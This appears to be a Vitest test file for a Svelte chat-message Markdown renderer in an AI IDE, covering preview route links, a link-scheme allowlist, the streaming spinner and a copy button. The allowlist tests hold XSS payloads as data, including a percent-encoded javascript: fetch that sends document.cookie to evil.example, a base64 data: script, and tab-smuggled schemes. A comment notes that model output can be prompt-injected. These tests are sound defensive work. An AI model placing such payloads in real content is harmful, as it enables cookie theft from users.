// @vitest-environment jsdom
/**
 * MarkdownContent — the chat message renderer: a port of
 * `@molecule/app-ide-react/src/__tests__/MarkdownContent.links.test.tsx` and
 * the `isAllowedLinkHref` block of its `link-href-allowlist.test.tsx`, with
 * the same test names and the same behavioral assertions, mounted through
 * Svelte 5's own `mount`/`flushSync`. The agent's "your app is ready" handoff
 * lists the app's pages as `[Label](/route)` links, and clicking one navigates
 * the LIVE PREVIEW to that page; every other scheme is inert text.
 *
 * The copy button's confirmation state is covered here too: the conformance
 * kit's MarkdownContent cases never click it (see the cases file).
 *
 * @module
 */

import '@molecule/app-framework-conformance/ui/setup'
import { flushSync, mount, unmount } from 'svelte'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { copyTextWithFallback } from '@molecule/app-clipboard'
import { createSimpleI18nProvider, setProvider } from '@molecule/app-i18n'
import { setClassMap } from '@molecule/app-ui'
import { classMap } from '@molecule/app-ui-tailwind'

vi.mock('@molecule/app-clipboard', () => ({
  copyTextWithFallback: vi.fn(async () => true),
}))

import { isAllowedLinkHref } from '../parts/markdown-content.js'
import MarkdownContent from '../parts/MarkdownContent.svelte'

const copyTextWithFallbackMock = vi.mocked(copyTextWithFallback)

/** The mount alive right now, torn down before the next one. */
let instance: Record<string, unknown> | null = null
let container: HTMLElement | null = null

beforeEach(() => {
  setClassMap(classMap)
  setProvider(createSimpleI18nProvider('en'))
  copyTextWithFallbackMock.mockReset()
  copyTextWithFallbackMock.mockResolvedValue(true)
})

afterEach(async () => {
  if (instance) await unmount(instance as never)
  instance = null
  container?.remove()
  container = null
  document.body.innerHTML = ''
  vi.useRealTimers()
  setProvider(createSimpleI18nProvider())
})

/**
 * Render the message the way ChatPanel does.
 *
 * @param props - Props to render with.
 * @returns The container element.
 */
function renderMarkdown(props: Record<string, unknown>): HTMLElement {
  document.body.innerHTML = ''
  container = document.createElement('div')
  document.body.appendChild(container)
  instance = mount(MarkdownContent as never, { target: container, props })
  flushSync()
  return container
}

/** Clicks like a user and lets Svelte flush the update. */
function click(el: HTMLElement | null): void {
  el?.click()
  flushSync()
}

describe('MarkdownContent links', () => {
  it('renders a route link as a button that navigates the preview on click', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({
      text: 'Your app is ready — open [Dashboard](/dashboard) to start.',
      onNavigatePreview,
    })
    const link = view.querySelector('[data-mol-id="chat-preview-link"]')
    expect(link).not.toBeNull()
    expect(link!.textContent).toBe('Dashboard')
    // The surrounding prose is preserved.
    expect(view.textContent).toContain('Your app is ready')

    click(link as HTMLElement)
    expect(onNavigatePreview).toHaveBeenCalledWith('/dashboard')
    // A route link must NOT be an anchor that navigates the IDE.
    expect(view.querySelector('a[href="/dashboard"]')).toBeNull()
  })

  it('renders route links inside a bulleted list (the handoff "Pages" list)', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({
      text: '**Pages**\n- [Home](/) — overview\n- [Settings](/settings) — preferences',
      onNavigatePreview,
    })
    const links = view.querySelectorAll('[data-mol-id="chat-preview-link"]')
    expect(links).toHaveLength(2)
    click(links[1] as HTMLElement)
    expect(onNavigatePreview).toHaveBeenCalledWith('/settings')
  })

  it('navigates the preview for a BARE route (no leading slash) instead of opening a new tab', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({ text: 'Open [Courses](courses) to begin.', onNavigatePreview })
    const link = view.querySelector('[data-mol-id="chat-preview-link"]')
    expect(link).not.toBeNull()
    expect(link!.textContent).toBe('Courses')
    expect(view.querySelector('a[target="_blank"]')).toBeNull()
    click(link as HTMLElement)
    expect(onNavigatePreview).toHaveBeenCalledWith('/courses')
  })

  it('navigates the preview for a bare nested (non-param) route', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({
      text: 'See [instructor courses](instructor/courses).',
      onNavigatePreview,
    })
    const link = view.querySelector('[data-mol-id="chat-preview-link"]')
    expect(link).not.toBeNull()
    click(link as HTMLElement)
    expect(onNavigatePreview).toHaveBeenCalledWith('/instructor/courses')
  })

  it('renders a PARAMETERIZED route (/courses/:id) as plain text, never a clickable link', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({
      text: 'See [a lesson](courses/:id/lessons/:lessonId).',
      onNavigatePreview,
    })
    expect(view.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
    expect(view.querySelector('a')).toBeNull()
    expect(view.textContent).toContain('a lesson')
    expect(onNavigatePreview).not.toHaveBeenCalled()
  })

  it('treats a protocol-relative URL (//host) as external, not a preview route', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({ text: 'See [site](//example.com/x).', onNavigatePreview })
    expect(view.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
    const anchor = view.querySelector('a[target="_blank"]')
    expect(anchor).not.toBeNull()
    expect(anchor!.getAttribute('href')).toBe('//example.com/x')
    expect(onNavigatePreview).not.toHaveBeenCalled()
  })

  it('renders an external link as a new-tab anchor (not a preview nav)', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({
      text: 'See the [docs](https://example.com/guide).',
      onNavigatePreview,
    })
    const anchor = view.querySelector('a[href="https://example.com/guide"]')
    expect(anchor).not.toBeNull()
    expect(anchor!.getAttribute('target')).toBe('_blank')
    expect(anchor!.getAttribute('rel')).toContain('noopener')
    expect(view.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
  })

  it('renders a route link as plain text when no preview handler is wired', () => {
    const view = renderMarkdown({ text: 'Go to [Home](/home).' })
    expect(view.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
    // The label shows as text, and there is NO anchor that would navigate the IDE to /home.
    expect(view.textContent).toContain('Home')
    expect(view.querySelector('a[href="/home"]')).toBeNull()
  })
})

describe('MarkdownContent link scheme allowlist', () => {
  // Model output is prompt-injectable (the agent reads imported repos, shared projects,
  // scraped content), and browsers percent-decode hrefs before executing them — so a
  // `javascript:` link in a chat message must never reach the DOM as an anchor. Only
  // http(s):/mailto: (plus protocol-relative //host) may anchor; every other scheme is
  // inert text: no anchor, no preview button.

  it('renders a javascript: link as inert text — never an anchor', () => {
    const onNavigatePreview = vi.fn()
    const view = renderMarkdown({
      text: 'Click [me](javascript:alert(1)) now.',
      onNavigatePreview,
    })
    expect(view.querySelector('a')).toBeNull()
    expect(view.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
    expect(view.textContent).toContain('me')
    expect(onNavigatePreview).not.toHaveBeenCalled()
  })

  it('renders a percent-encoded javascript: payload as inert text', () => {
    // Browsers percent-decode hrefs before executing: `[x](javascript:fetch%28…%29)`.
    const view = renderMarkdown({
      text: 'See [docs](javascript:fetch%28%27https%3A%2F%2Fevil.example%2F%3F%27%2Bdocument.cookie%29).',
    })
    expect(view.querySelector('a')).toBeNull()
    expect(view.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
    expect(view.textContent).toContain('docs')
  })

  it('renders data: and vbscript: links as inert text', () => {
    const view = renderMarkdown({
      text: 'Try [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==) or [b](vbscript:msgbox).',
    })
    expect(view.querySelectorAll('a')).toHaveLength(0)
    expect(view.textContent).toContain('a')
    expect(view.textContent).toContain('b')
  })

  it('does not turn a control-char broken scheme into an anchor', () => {
    // `java\tscript:` — either the link tokenizer stops at the whitespace (url class is
    // `[^)\s]+`) or the scheme regex fails on the tab; both roads lead to inert output,
    // never an anchor.
    const view = renderMarkdown({ text: 'Go [x](java\tscript:alert(1)).' })
    expect(view.querySelector('a')).toBeNull()
    expect(view.textContent).toContain('x')
  })

  it('still anchors http, https and mailto links', () => {
    const view = renderMarkdown({
      text: '[http](http://example.com) [https](https://example.com) [mail](mailto:a@b.c)',
    })
    const anchors = view.querySelectorAll('a[target="_blank"]')
    expect(anchors).toHaveLength(3)
    expect(anchors[0]!.getAttribute('href')).toBe('http://example.com')
    expect(anchors[1]!.getAttribute('href')).toBe('https://example.com')
    expect(anchors[2]!.getAttribute('href')).toBe('mailto:a@b.c')
  })
})

describe('isAllowedLinkHref (shared scheme gate)', () => {
  it('allows http(s), mailto and scheme-less hrefs', () => {
    expect(isAllowedLinkHref('https://molecule.dev/pricing')).toBe(true)
    expect(isAllowedLinkHref('http://example.test/page')).toBe(true)
    expect(isAllowedLinkHref('mailto:support@molecule.dev')).toBe(true)
    expect(isAllowedLinkHref('/projects/p1')).toBe(true)
    expect(isAllowedLinkHref('//cdn.example.test/lib.js')).toBe(true)
  })

  it('refuses scriptable schemes', () => {
    expect(isAllowedLinkHref('javascript:alert(1)')).toBe(false)
    expect(isAllowedLinkHref('JAVASCRIPT:alert(1)')).toBe(false)
    expect(isAllowedLinkHref('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isAllowedLinkHref('vbscript:msgbox(1)')).toBe(false)
  })

  it('refuses schemes smuggled past the parser with tab/newline (browsers strip them)', () => {
    expect(isAllowedLinkHref('java\tscript:alert(1)')).toBe(false)
    expect(isAllowedLinkHref('java\nscript:alert(1)')).toBe(false)
    expect(isAllowedLinkHref(' \u0000 javascript:alert(1)')).toBe(false)
  })
})

describe('MarkdownContent streaming indicator', () => {
  it('shows its own inline spinner while streaming by default', () => {
    const view = renderMarkdown({ text: 'working on it', isStreaming: true })
    // The MolSpinner renders an <svg>; it is the only svg this component emits.
    expect(view.querySelector('svg')).not.toBeNull()
  })

  it('suppresses its own spinner when hideStreamingIndicator is set (host owns the indicator)', () => {
    const view = renderMarkdown({
      text: 'working on it',
      isStreaming: true,
      hideStreamingIndicator: true,
    })
    expect(view.querySelector('svg')).toBeNull()
    // The text still renders live — only the per-message spinner is hidden.
    expect(view.textContent).toContain('working on it')
  })

  it('suppresses the labeled (verification) block too when hidden', () => {
    const view = renderMarkdown({
      text: 'done editing',
      isStreaming: true,
      statusLabel: 'Type-checking the app',
      hideStreamingIndicator: true,
    })
    expect(view.querySelector('svg')).toBeNull()
    expect(view.textContent).not.toContain('Type-checking the app')
  })
})

describe('MarkdownContent code blocks', () => {
  it('copies the code block content and confirms, then clears the confirmation', async () => {
    vi.useFakeTimers()
    const view = renderMarkdown({ text: '```ts\nconst a = 1\n```' })
    const copy = view.querySelector('[data-mol-id="chat-code-copy"]')
    expect(copy).not.toBeNull()
    expect(copy!.textContent).toBe('Copy')

    click(copy as HTMLElement)
    // The confirmation appears once the copy resolves.
    await Promise.resolve()
    flushSync()
    expect(copyTextWithFallbackMock).toHaveBeenCalledWith('const a = 1')
    expect(copy!.textContent).toBe('✓ Copied')

    vi.advanceTimersByTime(1500)
    flushSync()
    expect(copy!.textContent).toBe('Copy')
  })

  it('leaves the copy confirmation off when the copy reports failure', async () => {
    copyTextWithFallbackMock.mockResolvedValue(false)
    const view = renderMarkdown({ text: '```ts\nconst a = 1\n```' })
    const copy = view.querySelector('[data-mol-id="chat-code-copy"]')
    expect(copy).not.toBeNull()

    click(copy as HTMLElement)
    await Promise.resolve()
    flushSync()
    expect(copyTextWithFallbackMock).toHaveBeenCalledWith('const a = 1')
    expect(copy!.textContent).toBe('Copy')
  })
})
